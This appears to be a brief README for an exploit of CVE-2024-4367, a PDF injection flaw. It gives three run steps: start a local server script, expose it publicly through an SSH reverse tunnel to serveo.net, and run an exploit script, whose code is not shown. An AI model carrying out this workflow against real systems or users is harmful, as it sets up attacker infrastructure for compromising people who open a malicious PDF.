### Information

- CVE-2024-4367
- PDF Injection

### Exploit

- Run code server

```python
    python3 server.py
```

- Run serveo

```bash
    ssh -R 80:localhost:5003 serveo.net
```

- Run code exploit

```python
    python3 exp.py
```